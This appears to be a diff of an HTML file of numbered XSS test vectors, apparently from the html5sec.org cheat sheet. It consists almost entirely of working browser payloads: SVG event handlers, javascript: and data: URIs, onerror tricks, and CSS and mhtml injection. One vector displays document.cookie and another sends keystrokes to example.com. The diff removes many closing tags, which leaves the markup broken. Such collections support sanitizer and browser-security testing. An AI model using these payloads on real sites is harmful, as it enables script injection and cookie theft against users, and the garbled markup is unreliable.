@@ -69,12 +69,10 @@
 <foreignObject xlink:href="javascript:alert(88)"/>
 <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/>
 
-</svg>//["'`-->]]>]</div>
 
 <div id="89"><svg xmlns="http://www.w3.org/2000/svg">
 <set attributeName="onmouseover" to="alert(89)"/>
 <animate attributeName="onunload" to="alert(89)"/>
-</svg>//["'`-->]]>]</div>
 
 <div id="90"><!-- Up to Opera 10.63 -->
 <div style=content:url(test2.svg)></div>
@@ -97,14 +95,12 @@
 <div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
 <div id="94"><svg xmlns="http://www.w3.org/2000/svg">
 <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
-</svg>//["'`-->]]>]</div>
 
 <div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
 <feImage>
 <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
 PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
 </feImage>
-</svg>//["'`-->]]>]</div>
 
 <div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
 <iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
@@ -133,7 +129,6 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3
 <div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["'`-->]]>]</div><div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
 <div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
 <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
-</svg>//["'`-->]]>]</div>
 <div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
 <div id="108"><!-- IE 5-8 standards mode -->
 <a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">
@@ -145,11 +140,9 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3
 <div id="109"><svg xmlns="http://www.w3.org/2000/svg">
 <a id="x"><rect fill="white" width="1000" height="1000"/></a>
 <rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
-</svg>//["'`-->]]>]</div>
 
 <div id="110"><svg xmlns="http://www.w3.org/2000/svg">
 <path d="M0,0" style="marker-start:url(test4.svg#a)"/>
-</svg>//["'`-->]]>]</div>
 <div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
 <div id="113"><div id="x">XXX</div>
 <style>
@@ -158,7 +151,6 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3
 
 #y];color:red;{}
 
-</style>//["'`-->]]>]</div>
 <div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
 <div id="115"><!--[if]><script>alert(115)</script -->
 <!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
@@ -187,7 +179,6 @@ function makePopups(){
     for (i=1;i<6;i++) {
         window.open('popup.html','spam'+i,'width=50,height=50');
     }
-}
 </script>
 
 <body>
@@ -204,7 +195,6 @@ xmlns:svg="http://www.w3.org/2000/svg">
 </svg:mask>
 </svg:svg>
 </body>
-</html>//["'`-->]]>]</div>
 <div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
 <div id="123"><span class=foo>Some text</span>
 <a class=bar href="http://www.example.org">www.example.org</a>
@@ -218,7 +208,6 @@ $("a.bar").click();
 $("a.bar").click(function() {
 alert('bar');
 location="http://html5sec.org";
-});
 </script>//["'`-->]]>]</div>
 
 <div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
@@ -236,7 +225,6 @@ location="http://html5sec.org";
         </xsl:template>
     </xsl:stylesheet>
     <circle fill="red" r="40"></circle>
-</svg>//["'`-->]]>]</div>
 
 <div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
 <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
@@ -244,15 +232,12 @@ location="http://html5sec.org";
 <div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
 <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
 <handler id="y">alert(127)</handler>
-</svg>//["'`-->]]>]</div>
 <div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
 <div id="129"><svg>
 <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
-<!--
 Same effect with
 <image filter='...'>
 -->
-</svg>//["'`-->]]>]</div>
 
 <div id="130"><math href="javascript:alert(130)">CLICKME</math>
 
@@ -267,13 +252,9 @@ Same effect with
 <div id="131"><b>drag and drop one of the following strings to the drop box:</b>
 <br/><hr/>
 jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
-<br/><hr/>
 feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
-<br/><hr/>
 feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>
-<br/><hr/>
 feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
-<br/><hr/>
 <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["'`-->]]>]</div>
 
 <div id="132"><!doctype html>
@@ -289,23 +270,18 @@ feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.locati
 <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
 <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
 </image>
-</svg>//["'`-->]]>]</div>
 <div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
 <div id="134"><xmp>
 <%
 </xmp>
 <img alt='%></xmp><img src=xx:x onerror=alert(134)//'>
 
-<script>
 x='<%'
 </script> %>/
 alert(2)
-</script>
 
 XXX
-<style>
 *['<!--']{}
-</style>
 -->{}
 *{color:red}</style>//["'`-->]]>]</div>
 
@@ -328,5 +304,4 @@ XXX
 <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
 <circle r="400"></circle>
 <animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
-</a>//["'`-->]]>]</div>
 <div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
